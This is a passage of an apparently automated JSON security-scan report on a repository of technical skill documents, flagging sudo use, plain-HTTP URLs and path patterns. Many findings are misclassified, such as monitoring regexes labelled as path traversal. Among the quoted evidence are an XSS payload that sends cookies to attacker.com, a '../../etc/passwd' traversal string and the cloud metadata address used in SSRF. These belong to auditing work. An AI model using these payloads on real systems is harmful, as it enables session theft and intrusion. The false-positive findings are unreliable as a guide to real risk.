        "file": "skills/debugging/network-debugging.md",
        "line_number": 160,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump host api.example.com",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 163,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump port 443",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 164,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump port 80 or port 443",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 167,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -A 'tcp port 80'",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 171,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any port 53",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 174,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -w /tmp/capture.pcap",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 180,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -tttt -i any port 443",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 183,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -c 100 -i any",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 186,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -v -i any host api.example.com",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 189,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump src 192.168.1.10",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 190,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump dst 10.0.0.5",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 193,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0'",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 196,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump 'tcp[tcpflags] & tcp-rst != 0'",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 199,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump host 192.168.1.10 and host 10.0.0.5",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 202,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any port not 22",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 205,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -s 65535 -i any -w /tmp/full-capture.pcap",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 208,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -A 'host api.example.com and port 443' -w /tmp/api-debug.pcap",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 421,
        "issue": "Privilege escalation",
        "evidence": "sudo ping -f api.example.com",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 518,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get update && sudo apt-get install -y \\",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 601,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -w /tmp/capture.pcap  # Fills disk!",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 604,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -c 1000 -w /tmp/capture.pcap  # 1000 packets",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/network-debugging.md",
        "line_number": 605,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i any -G 60 -w /tmp/capture.pcap    # 60 seconds",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/memory-leak-debugging.md",
        "line_number": 470,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install heaptrack heaptrack-gui",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 109,
        "issue": "Privilege escalation",
        "evidence": "sudo perf record -F 99 -g -a -- sleep 30",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 349,
        "issue": "Privilege escalation",
        "evidence": "sudo dtrace -x ustackframes=100 -n 'profile-997 /pid == <pid>/ { @[ustack()] = count(); }' -o out.stacks",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 428,
        "issue": "Privilege escalation",
        "evidence": "sudo iotop -o  # Only show processes doing I/O",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 434,
        "issue": "Privilege escalation",
        "evidence": "sudo perf trace -p <pid>",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 485,
        "issue": "Privilege escalation",
        "evidence": "sudo perf lock record -p <pid> -- sleep 30",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 488,
        "issue": "Privilege escalation",
        "evidence": "sudo perf lock report",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/performance-profiling.md",
        "line_number": 519,
        "issue": "Privilege escalation",
        "evidence": "sudo perf record -F 99 -g -a -- sleep 30",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/remote-debugging.md",
        "line_number": 593,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install <package>-dbg",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/debugging/remote-debugging.md",
        "line_number": 596,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install python3.11-dbg",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/ml/llm-evaluation-frameworks.md",
        "line_number": 793,
        "issue": "Unencrypted HTTP",
        "evidence": "PHOENIX_ENDPOINT = os.getenv(\"PHOENIX_ENDPOINT\", \"http://phoenix:6006/v1/traces\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/ml/huggingface/huggingface-autotrain.md",
        "line_number": 143,
        "issue": "Path traversal pattern",
        "evidence": "\"Below is an instruction...\\n\\n### Instruction:\\nWhat is Python?\\n\\n### Response:\\nPython is a programming language.\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/ml/huggingface/huggingface-autotrain.md",
        "line_number": 144,
        "issue": "Path traversal pattern",
        "evidence": "\"Below is an instruction...\\n\\n### Instruction:\\nExplain AI\\n\\n### Response:\\nAI stands for Artificial Intelligence.\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/ml/huggingface/huggingface-autotrain.md",
        "line_number": 151,
        "issue": "Path traversal pattern",
        "evidence": "\"text\": \"Below is an instruction...\\n\\n### Instruction:\\nWhat is Python?\\n\\n### Response:\\nPython is a programming language.\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/ml/huggingface/huggingface-autotrain.md",
        "line_number": 154,
        "issue": "Path traversal pattern",
        "evidence": "\"text\": \"Below is an instruction...\\n\\n### Instruction:\\nExplain AI\\n\\n### Response:\\nAI stands for Artificial Intelligence.\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/build-systems/bazel-monorepos.md",
        "line_number": 45,
        "issue": "Privilege escalation",
        "evidence": "sudo mv bazelisk-linux-amd64 /usr/local/bin/bazel",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/build-systems/gradle-jvm-builds.md",
        "line_number": 379,
        "issue": "Path traversal pattern",
        "evidence": "includeBuild(\"../shared-library\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/build-systems/cross-platform-builds.md",
        "line_number": 571,
        "issue": "Path traversal pattern",
        "evidence": "cmake -DCMAKE_TOOLCHAIN_FILE=../toolchain-arm64.cmake .. ; \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/build-systems/build-optimization.md",
        "line_number": 231,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install ccache         # Linux",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/build-systems/build-optimization.md",
        "line_number": 657,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install distcc",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/build-systems/build-optimization.md",
        "line_number": 672,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install icecc",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/build-systems/maven-configuration.md",
        "line_number": 29,
        "issue": "Unencrypted HTTP",
        "evidence": "<project xmlns=\"http://maven.apache.org/POM/4.0.0\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/build-systems/maven-configuration.md",
        "line_number": 30,
        "issue": "Unencrypted HTTP",
        "evidence": "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/build-systems/maven-configuration.md",
        "line_number": 31,
        "issue": "Unencrypted HTTP",
        "evidence": "xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/build-systems/maven-configuration.md",
        "line_number": 32,
        "issue": "Unencrypted HTTP",
        "evidence": "http://maven.apache.org/xsd/maven-4.0.0.xsd\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/security/input-validation.md",
        "line_number": 400,
        "issue": "Path traversal pattern",
        "evidence": "# Attack: filename = \"../../etc/passwd\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/security/vulnerability-assessment.md",
        "line_number": 51,
        "issue": "Path traversal pattern",
        "evidence": "\"https://api.example.com/files/../../etc/passwd\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment.md",
        "line_number": 430,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://169.254.169.254/latest/meta-data/\",  # AWS metadata",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/security-headers.md",
        "line_number": 267,
        "issue": "Unencrypted HTTP",
        "evidence": "url = request.url.replace('http://', 'https://', 1)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/security-headers.md",
        "line_number": 534,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
        "line_number": 96,
        "issue": "Unencrypted HTTP",
        "evidence": "username: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
        "line_number": 182,
        "issue": "Unencrypted HTTP",
        "evidence": "- http://www.pentest-standard.org/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 255,
        "issue": "Privilege escalation",
        "evidence": "wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 256,
        "issue": "Privilege escalation",
        "evidence": "echo \"deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main\" | sudo tee -a /etc/apt/sources.list.d/trivy.list",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 257,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get update",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/container-security.md",
        "line_number": 258,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install trivy",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/docker-compose-development.md",
        "line_number": 302,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://web:80",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/docker-compose-development.md",
        "line_number": 343,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api:3000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/docker-compose-development.md",
        "line_number": 344,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api-server:3000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/docker-compose-development.md",
        "line_number": 345,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://backend-api:3000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/container-networking.md",
        "line_number": 69,
        "issue": "Unencrypted HTTP",
        "evidence": "docker exec web curl http://api:3000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/container-networking.md",
        "line_number": 293,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://db:5432",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/container-networking.md",
        "line_number": 461,
        "issue": "Unencrypted HTTP",
        "evidence": "docker exec web curl http://api:3000/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/container-networking.md",
        "line_number": 503,
        "issue": "Unencrypted HTTP",
        "evidence": "**Symptom**: `curl https://google.com` works, `curl http://api` fails",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 650,
        "issue": "Force flag usage",
        "evidence": "npm cache clean --force && \\",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 827,
        "issue": "Force flag usage",
        "evidence": "npm cache clean --force",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/production-incident-debugging.md",
        "line_number": 205,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.post('http://inventory-service/check', headers=headers)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/production-incident-debugging.md",
        "line_number": 509,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-a/api')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/production-incident-debugging.md",
        "line_number": 512,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-b/api')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 164,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"sum(rate(http_requests_total{service=\\\"api\\\",status=~\\\"5..\\\"}[5m])) / sum(rate(http_requests_total{service=\\\"api\\\"}[5m])) * 100\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 219,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"sum(rate(http_requests_total{status!~\\\"5..\\\"}[30d])) / sum(rate(http_requests_total[30d])) * 100\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 247,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"(0.001 - (1 - sum(rate(http_requests_total{status!~\\\"5..\\\"}[30d])) / sum(rate(http_requests_total[30d])))) / 0.001 * 100\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 276,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"(sum(rate(http_requests_total{status=~\\\"5..\\\"}[1h])) / sum(rate(http_requests_total[1h]))) / 0.001\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 280,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"(sum(rate(http_requests_total{status=~\\\"5..\\\"}[6h])) / sum(rate(http_requests_total[6h]))) / 0.001\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/observability/dashboard-design.md",
        "line_number": 322,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"sum by (endpoint) (rate(http_requests_total{service=\\\"api\\\",status=~\\\"5..\\\"}[5m]))\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 159,
        "issue": "Unencrypted HTTP",
        "evidence": "endpoint: http://loki:3100/loki/api/v1/push",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 225,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get(f'http://auth-service/validate/{user_id}')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 261,
        "issue": "Unencrypted HTTP",
        "evidence": "span_exporter = OTLPSpanExporter(endpoint=\"http://otel-collector:4317\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 268,
        "issue": "Unencrypted HTTP",
        "evidence": "OTLPMetricExporter(endpoint=\"http://otel-collector:4317\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 621,
        "issue": "Unencrypted HTTP",
        "evidence": "-Dotel.exporter.otlp.endpoint=http://otel-collector:4317 \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/opentelemetry-integration.md",
        "line_number": 642,
        "issue": "Unencrypted HTTP",
        "evidence": "export OTEL_EXPORTER_OTLP_ENDPOINT=http://otel-collector:4318",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing.md",
        "line_number": 304,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://service-b/api/data\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing.md",
        "line_number": 536,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.get(\"http://service-b/api/data\")  # Breaks trace!",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing.md",
        "line_number": 541,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.get(\"http://service-b/api/data\", headers=headers)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing/resources/REFERENCE.md",
        "line_number": 1721,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get(\"http://service-b/api\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing/resources/REFERENCE.md",
        "line_number": 1730,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get(\"http://service-b/api\", headers=headers)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/prometheus-monitoring/resources/REFERENCE.md",
        "line_number": 3073,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://prometheus;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/prometheus-monitoring/resources/REFERENCE.md",
        "line_number": 3087,
        "issue": "Unencrypted HTTP",
        "evidence": "3. URL: `http://prometheus:9090`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
        "line_number": 2340,
        "issue": "Unencrypted HTTP",
        "evidence": "url: http://prometheus:9090",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
        "line_number": 2476,
        "issue": "Unencrypted HTTP",
        "evidence": "1. Check target status: `http://prometheus:9090/targets`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/metrics-instrumentation/resources/REFERENCE.md",
        "line_number": 2477,
        "issue": "Unencrypted HTTP",
        "evidence": "2. Verify metrics endpoint: `curl http://app:8080/metrics`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/mosh-resilient-ssh.md",
        "line_number": 24,
        "issue": "Privilege escalation",
        "evidence": "sudo apt install mosh",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/mosh-resilient-ssh.md",
        "line_number": 90,
        "issue": "Privilege escalation",
        "evidence": "sudo ufw allow 60000:61000/udp",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/mosh-resilient-ssh.md",
        "line_number": 93,
        "issue": "Privilege escalation",
        "evidence": "sudo ufw allow 60001/udp",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 49,
        "issue": "Privilege escalation",
        "evidence": "sudo tailscale up",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 158,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get(\"http://api-server:8000/data\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 194,
        "issue": "Privilege escalation",
        "evidence": "echo 'net.ipv4.ip_forward = 1' | sudo tee -a /etc/sysctl.conf",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 195,
        "issue": "Privilege escalation",
        "evidence": "sudo sysctl -p",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 201,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://172.17.0.2:8000",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 362,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://dev-server:3000    # React dev server",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 363,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://dev-server:8000    # Django backend",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 394,
        "issue": "Force flag usage",
        "evidence": "--force-new-deployment",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 773,
        "issue": "Unencrypted HTTP",
        "evidence": "- kubectl run curl-test --image=curlimages/curl --rm -it --restart=Never -- curl -f http://myapp-$NEW_COLOR.prod.svc.cluster.local/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 1021,
        "issue": "Unencrypted HTTP",
        "evidence": "ERROR_RATE=\\$(curl -s http://prometheus:9090/api/v1/query?query=rate(http_requests_total{status=~\"5..\"}[5m]) | jq -r '.data.result[0].value[1]')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies.md",
        "line_number": 189,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://myapp-green-preview/health",
